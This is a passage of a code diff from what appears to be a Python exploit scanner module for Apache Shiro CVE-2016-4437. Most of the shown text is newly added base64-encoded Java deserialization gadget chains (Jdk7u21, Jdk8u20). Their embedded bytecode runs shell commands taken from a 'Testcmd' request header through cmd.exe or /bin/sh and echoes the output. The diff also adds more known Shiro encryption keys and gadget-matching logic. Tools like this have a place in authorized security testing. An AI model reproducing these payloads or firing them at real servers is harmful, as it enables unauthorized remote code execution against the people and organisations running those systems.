             "JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAp"
             "bAAtpUGFyYW1UeXBlc3EAfgAJeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ"
             "1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAAXR4")
-        
+        self.Jdk7u21 = ("rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4"
+            "tzQDAAB4cHcMAAAAED9AAAAAAAACc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRl"
+            "c0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19h"
+            "dXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0"
+            "ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0"
+            "cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgAC"
+            "W0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb292NGhBMnZ1U1MHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNl"
+            "RmlsZQEAEUZvb3Y0aEEydnVTUy5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRv"
+            "bWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5n"
+            "OylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEA"
+            "CHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAa"
+            "AB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZs"
+            "ZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcB"
+            "AAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAAr"
+            "AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0"
+            "AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29k"
+            "ZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcv"
+            "T2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcv"
+            "U3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcA"
+            "RwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZs"
+            "ZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9G"
+            "aWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9T"
+            "dHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcv"
+            "VGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhy"
+            "ZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABw"
+            "AHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6"
+            "AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnBy"
+            "b2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7"
+            "DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQAD"
+            "KClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9s"
+            "YW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCp"
+            "AQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2"
+            "AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylW"
+            "DAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAO"
+            "Z2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYM"
+            "ACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4A"
+            "zwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMB"
+            "ABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEK"
+            "AOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGlt"
+            "ZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAM"
+            "WQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAE"
+            "WQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFen"
+            "AAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6n"
+            "ABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAK"
+            "BwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkS"
+            "a7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAG"
+            "pwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2"
+            "ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9"
+            "AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQr"
+            "tgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAa"
+            "WREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZ"
+            "GQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5c"
+            "FQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEH"
+            "AGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcA"
+            "BAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcA"
+            "CAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnB0AANhYmNzcgAUamF2YS51dGlsLlByb3BlcnRpZXM5EtB6cDY+"
+            "mAIAAUwACGRlZmF1bHRzcQB+AAh4cgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9s"
+            "ZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcu"
+            "cmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADJzdW4u"
+            "cmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGph"
+            "dmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxv"
+            "YWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQACGY1YTVhNjA4cQB+AAl4dnIAHWphdmF4LnhtbC50cmFuc2Zv"
+            "cm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHg=")
+        self.Jdk8u20 = ("rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4"
+            "tzQDAABzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAF"
+            "SQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtWwAKX2J5dGVjb2Rlc3QAA1tbQkwA"
+            "BV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHAAAAAB/////wF1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIA"
+            "AHhwAAAPA8r+ur4AAAAyAOkBAAxGb29veTZhOTVuNkYHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb295"
+            "NmE5NW42Ri5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1"
+            "Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5n"
+            "L0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAV"
+            "AQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNs"
+            "YXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsM"
+            "AB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADko"
+            "TGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MB"
+            "ABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5n"
+            "L05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlv"
+            "bnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZh"
+            "L2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2"
+            "YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVy"
+            "Y2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2li"
+            "bGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dl"
+            "dAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMo"
+            "KVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBj"
+            "CgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBC"
+            "CgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4"
+            "ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8"
+            "AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYB"
+            "AA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEA"
+            "A3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwA"
+            "mwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcA"
+            "pQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNh"
+            "c2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGls"
+            "L1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEA"
+            "BXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJl"
+            "YW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQAC"
+            "XEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4"
+            "dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0"
+            "aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2"
+            "YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy"
+            "YW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZ"
+            "BbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6"
+            "BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsA"
+            "NwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABan"
+            "AAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAE"
+            "BwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYG"
+            "FQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4"
+            "AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUr"
+            "A70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUs"
+            "BL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMS"
+            "XFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxX"
+            "EqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3"
+            "AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn"
+            "/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcA"
+            "AgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8B"
+            "BwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8B"
+            "BwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnQAA2FiY3cBAHhzcgApamF2YS5iZWFucy5iZWFuY29udGV4dC5CZWFuQ29udGV4dFN1"
+            "cHBvcnS8SCDwkY+5DAMAAUkADHNlcmlhbGl6YWJsZXhyAC5qYXZhLmJlYW5zLmJlYW5jb250ZXh0LkJlYW5Db250ZXh0Q2hpbGRTdXBw"
+            "b3J0V9TvxwTcciUDAAFMABRiZWFuQ29udGV4dENoaWxkUGVlcnQAKUxqYXZhL2JlYW5zL2JlYW5jb250ZXh0L0JlYW5Db250ZXh0Q2hp"
+            "bGQ7eHBxAH4ADngAAAABc3IAMnN1bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jYXRpb25IYW5kbGVyVcr1DxXLfqUD"
+            "AAJMAAxtZW1iZXJWYWx1ZXN0AA9MamF2YS91dGlsL01hcDtMAAR0eXBldAARTGphdmEvbGFuZy9DbGFzczt4cHNyABFqYXZhLnV0aWwu"
+            "SGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAIZjVhNWE2MDhxAH4A"
+            "BXh2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAMAAHhwdwQAAAAAeHhwdwwAAAAQP0AAAAAAAAJxAH4ABXN9"
+            "AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0"
+            "ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBxAH4AEng=")
 
     def cve_2016_4437(self):
+        # 2020-01-06 新增3个共6个回显gadget
+        self.threadLock.acquire()
         self.pocname = "Apache Shiro: CVE-2016-4437"
-        self.corename = "null"
         self.rawdata = None
         self.info = "null"
         self.method = "get"
@@ -699,11 +949,11 @@ class ApacheShiro():
         self.cmd = self.base64_cmd.decode('ascii')
         self.r = "PoCWating"
         self.headers = {
-            'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            'User-agent' : USER_AGENT,
             'Testcmd': CMD
         }
-        self.key_lists = ['kPH+bIxk5D2deZiIxcaaaA==', 'fCq+/xW488hMTCD+cmJ3aQ==', '4AvVhmFLUs0KTA3Kprsdag==']
-        self.gadget_lists = [self.CommonsBeanutils1, self.CommonsCollectionsK1, self.CommonsCollectionsK2]
+        self.key_lists = ['kPH+bIxk5D2deZiIxcaaaA==', 'fCq+/xW488hMTCD+cmJ3aQ==', '4AvVhmFLUs0KTA3Kprsdag==', 'Z3VucwAAAAAAAAAAAAAAAA==', '0AvVhmFLUs0KTA3Kprsdag==']
+        self.gadget_lists = [self.CommonsBeanutils1, self.CommonsBeanutils2, self.CommonsCollectionsK1, self.CommonsCollectionsK2, self.Jdk7u21, self.Jdk8u20]
         try:
             if VULN == None:
                 for self.key in self.key_lists:
@@ -719,12 +969,18 @@ class ApacheShiro():
                                                     cookies={'rememberMe':base64_ciphertext}, 
                                                     timeout=TIMEOUT, verify=False)
                         self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-                        if "rO0ABXNyABdqYXZhLnV0aWwuUHJpb" in self.gadget:
+                        if "joYjqcyKkSAI" in self.gadget:
                             self.Gadget = "CommonsBeanutils1"
-                        elif "AAAADHcIAAAAEAAAAAB4eHQAAXR4" in self.gadget:
-                            self.Gadget = "CommonsCollectionsK2"
-                        else:
+                        elif r"PjgGC/k7xfgI" in self.gadget:
+                            self.Gadget = "CommonsBeanutils2"
+                        elif r"MdwgAAAAQAAAAAHh4dAABdHg=" in self.gadget:
                             self.Gadget = "CommonsCollectionsK1"
+                        elif r"AAAADHcIAAAAEAAAAAB4eHQAAXR4" in self.gadget:
+                            self.Gadget = "CommonsCollectionsK2"
+                        elif r"B4cHcMAAAAED9AAAAAAAA" in self.gadget:
+                            self.Gadget = "Jdk7u21"
+                        elif r"BzcgA6Y29tLnN1bi5vcmc" in self.gadget:
+                            self.Gadget = "Jdk8u20"
                         if r"VuLnEcHoPoCSuCCeSS" in self.request.text:
                             self.r = "PoCSuCCeSS"
                             self.info = color.rce() + " [key:" + self.key + "] [gadget:" + self.Gadget + "]"
@@ -737,10 +993,16 @@ class ApacheShiro():
                 self.gadget = SHIRO_GADGET
                 if self.gadget == "CommonsBeanutils1":
                     self.gadget_payload = self.CommonsBeanutils1
-                if self.gadget == "CommonsCollectionsK1":
+                elif self.gadget == "CommonsBeanutils2":
+                    self.gadget_payload = self.CommonsBeanutils2
+                elif self.gadget == "CommonsCollectionsK1":
                     self.gadget_payload = self.CommonsCollectionsK1
-                if self.gadget == "CommonsCollectionsK2":
+                elif self.gadget == "CommonsCollectionsK2":
                     self.gadget_payload = self.CommonsCollectionsK2
+                elif self.gadget == "Jdk7u21":
+                    self.gadget_payload = self.Jdk7u21
+                elif self.gadget == "Jdk8u20":
+                    self.gadget_payload = self.Jdk8u20
                 BS = AES.block_size
                 pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                 mode =  AES.MODE_CBC
@@ -757,10 +1019,12 @@ class ApacheShiro():
